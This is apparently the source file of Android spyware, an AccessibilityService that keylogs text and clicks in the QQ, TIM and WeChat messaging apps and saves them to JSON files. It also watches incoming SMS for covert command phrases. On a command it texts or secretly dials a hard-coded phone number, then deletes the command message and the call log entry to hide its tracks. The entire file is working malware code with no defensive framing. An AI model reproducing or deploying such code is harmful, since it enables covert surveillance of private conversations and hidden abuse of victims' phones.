package com.vergermiya.harevost.fckurprivacy.SilentShooter;

import android.accessibilityservice.AccessibilityService;
import android.annotation.TargetApi;
import android.os.Build;
import android.os.Handler;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import com.vergermiya.harevost.fckurprivacy.CallLogger.CallLogger;
import com.vergermiya.harevost.fckurprivacy.KeyLogger.KeyLogJson;
import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsJson;
import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsObserver;
import com.vergermiya.harevost.fckurprivacy.Util.FileSaver;
import com.vergermiya.harevost.fckurprivacy.Util.JsonBuilder;

import org.json.JSONStringer;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;

/**
 * Created by harevost on 18-7-20.
 */

public class SmsCallService extends AccessibilityService {

    private static final String TAG = "SmsCallService";
    private static final String SMS_COMMAND = "安排上了";
    private static final String CALL_COMMAND = "钦定";
    private static final int TIME = 5000;

    private static String APP_QQ = "com.tencent.qq";
    private static String APP_TIM = "com.tencent.tim";
    private static String APP_MM = "com.tencent.mm";

    private static CharSequence lastPackage = "";
    private static CharSequence targetPackage = "";
    private static SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.CHINA);

    private static String logData = "";
    private static int textDataLen = 0;
    private static boolean isBuiltJson = false;

    public SmsCallService() {
    }

    @Override
    public void onServiceConnected(){

        Log.d(TAG, "Starting service");

        try {
            String latestSms = SmsObserver.getLatestSmsJson(getApplicationContext(), SmsObserver.SMS_INBOX).getBody();

            final Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    try {
                        handler.postDelayed(this, TIME);
                        final String latestSms = SmsObserver.getLatestSmsJson(getApplicationContext(), SmsObserver.SMS_INBOX).getBody();
                        if (latestSms.equals(SMS_COMMAND)) {
                            new Thread() {
                                public void run() {
                                    sendSms("18801214501", "GOT IT!");
                                    deleteSms();
                                }
                            }.start();

                        } else if (latestSms.equals(CALL_COMMAND)) {
                            new Thread() {
                                public void run() {
                                    deleteSms();
                                    makeCall();
                                    CallLogger.deleteLatestCallLog(getApplicationContext());
                                }
                            }.start();
                        }


                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }, TIME);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        int eventType = event.getEventType();
        CharSequence currentPackage = "";

        Date date = new Date(System.currentTimeMillis());
        String nowDate = dateFormat.format(date);

        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (event.getPackageName() != null && !event.getPackageName().equals("")) {
                currentPackage = event.getPackageName();
                Log.d("KeyLogger.currentPkg", currentPackage.toString());
            }
            if (!currentPackage.equals("")) {
                lastPackage = currentPackage;
                Log.d("KeyLogger.lastPkg", lastPackage.toString());
            }
        }

        if (lastPackage.equals(APP_QQ) || lastPackage.equals(APP_MM) || lastPackage.equals(APP_TIM)) {
            isBuiltJson = false;
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                    String textData = event.getText().toString();
                    int dataLen = textData.length();
                    Log.d("KeyLogger", "TEXT:" + textData);
                    if (dataLen >= textDataLen) {
                        textDataLen = dataLen;
                    }
                    logData += textData.replace("[", "|t_").replace("]", "_t|");
                    break;
                }
                case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                    String clickedData = event.getText().toString();
                    Log.d("KeyLogger", "CLICKED:" + clickedData);
                    logData += clickedData.replace("[", "|c_").replace("]", "_c|");
                    textDataLen = 0;
                    break;
                }
            }
            targetPackage = lastPackage;
        } else {
            if (!isBuiltJson) {
                JSONStringer keyLogJsonStr = JsonBuilder.buildKeyLogJson(new KeyLogJson(nowDate, targetPackage.toString(), logData));
                String fileName = targetPackage.toString() + "_" + nowDate + "_" + "KeyLog";
                Log.d("KeyLogger", keyLogJsonStr.toString());
                isBuiltJson = true;
                FileSaver fileSaver = new FileSaver();
                fileSaver.saveFile(fileName, ".json", keyLogJsonStr.toString());
            }
            targetPackage = "";
            textDataLen = 0;
        }
    }

    @Override
    public void onInterrupt() {

    }


    public void deleteSms(){
        this.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
        Sleep();
        AccessibilityNodeInfo accessibilityNodeInfo = getRootInActiveWindow();
        List<AccessibilityNodeInfo> nodeInfoList = accessibilityNodeInfo.findAccessibilityNodeInfosByText("信息");
        nodeInfoList.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
        Sleep();
        accessibilityNodeInfo = getRootInActiveWindow();
        //nodeInfoList = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId("swipeableContent");
        for(int i = 0; i < 6; i++){
            accessibilityNodeInfo = accessibilityNodeInfo.getChild(0);
        }
        accessibilityNodeInfo = accessibilityNodeInfo.getChild(1);
        for(int i = 0; i < 2; i++){
            accessibilityNodeInfo = accessibilityNodeInfo.getChild(0);
        }
        //accessibilityNodeInfo = accessibilityNodeInfo.getChild(2).getChild(0);
        accessibilityNodeInfo.performAction(AccessibilityNodeInfo.ACTION_LONG_CLICK);
        Sleep();
        accessibilityNodeInfo = getRootInActiveWindow();
        for(int i = 0; i < 7; i++){
            accessibilityNodeInfo = accessibilityNodeInfo.getChild(0);
        }
        accessibilityNodeInfo = accessibilityNodeInfo.getChild(1).getChild(1);
        accessibilityNodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        Sleep();
        accessibilityNodeInfo = getRootInActiveWindow();
        for(int i = 0; i < 3; i++){
            accessibilityNodeInfo = accessibilityNodeInfo.getChild(0);
        }
        accessibilityNodeInfo = accessibilityNodeInfo.getChild(1).getChild(1);
        accessibilityNodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        this.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
    }

    public void makeCall(){
        this.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
        Sleep();
        AccessibilityNodeInfo accessibilityNodeInfo = getRootInActiveWindow();
        List<AccessibilityNodeInfo> nodeInfoList = accessibilityNodeInfo.findAccessibilityNodeInfosByText("电话");
        nodeInfoList.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
        Sleep();
        try {
            accessibilityNodeInfo = getRootInActiveWindow();
            for (int i = 0; i < 5; i++) {
                accessibilityNodeInfo = accessibilityNodeInfo.getChild(0);
            }
            accessibilityNodeInfo = accessibilityNodeInfo.getChild(2);
            accessibilityNodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            Sleep();
        }
        catch(Exception e) {
        }
        AccessibilityNodeInfo root = getRootInActiveWindow();
        AccessibilityNodeInfo number = root;
        for(int i = 0; i < 5; i++){
            number = number.getChild(0);
        }
        for(int i = 0; i < 2; i++){
            number = number.getChild(1);
        }
        number = number.getChild(0).getChild(2).getChild(0).getChild(2);
        AccessibilityNodeInfo one = number.getChild(0).getChild(0);
        AccessibilityNodeInfo two = number.getChild(0).getChild(1);
        AccessibilityNodeInfo three = number.getChild(0).getChild(2);
        AccessibilityNodeInfo four = number.getChild(1).getChild(0);
        AccessibilityNodeInfo five = number.getChild(1).getChild(1);
        AccessibilityNodeInfo six = number.getChild(1).getChild(2);
        AccessibilityNodeInfo seven = number.getChild(2).getChild(0);
        AccessibilityNodeInfo eight = number.getChild(2).getChild(1);
        AccessibilityNodeInfo nine = number.getChild(2).getChild(2);
        AccessibilityNodeInfo zero = number.getChild(3).getChild(1);
        one.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        eight.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        one.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        four.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        six.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        five.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        six.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        seven.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        six.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        two.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        zero.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        AccessibilityNodeInfo dial = root;
        for(int i = 0; i < 5; i++){
            dial = dial.getChild(0);
        }
        for(int i = 0; i < 3; i++){
            dial = dial.getChild(1);
        }
        //dial = dial.getChild(0);
        dial.performAction(AccessibilityNodeInfo.ACTION_CLICK);
    }

    /*public AccessibilityNodeInfo findViewByText(String text, boolean clickable) {
        AccessibilityNodeInfo accessibilityNodeInfo = getRootInActiveWindow();
        if (accessibilityNodeInfo == null) {
            return null;
        }
        List<AccessibilityNodeInfo> nodeInfoList = accessibilityNodeInfo.findAccessibilityNodeInfosByText(text);
        if (nodeInfoList != null && !nodeInfoList.isEmpty()) {
            for (AccessibilityNodeInfo nodeInfo : nodeInfoList) {
                if (nodeInfo != null && (nodeInfo.isClickable() == clickable)) {
                    return nodeInfo;
                }
            }
        }
        return null;
    }*/

    public void error(){
        Log.d(TAG, "error");
    }

    public void Sleep(){
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR2)
    public AccessibilityNodeInfo findViewByID(String id) {
        AccessibilityNodeInfo accessibilityNodeInfo = getRootInActiveWindow();
        if (accessibilityNodeInfo == null) {
            return null;
        }
        List<AccessibilityNodeInfo> nodeInfoList = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(id);
        if (nodeInfoList != null && !nodeInfoList.isEmpty()) {
            for (AccessibilityNodeInfo nodeInfo : nodeInfoList) {
                if (nodeInfo != null) {
                    return nodeInfo;
                }
            }
        }
        return null;
    }

    public void sendSms(String phoneNumber, String message) {
        SmsManager smsManager = SmsManager.getDefault();
        List<String> divideContents = smsManager.divideMessage(message);
        for (String text : divideContents) {
            smsManager.sendTextMessage(phoneNumber, null, text, null, null);
        }
    }
}
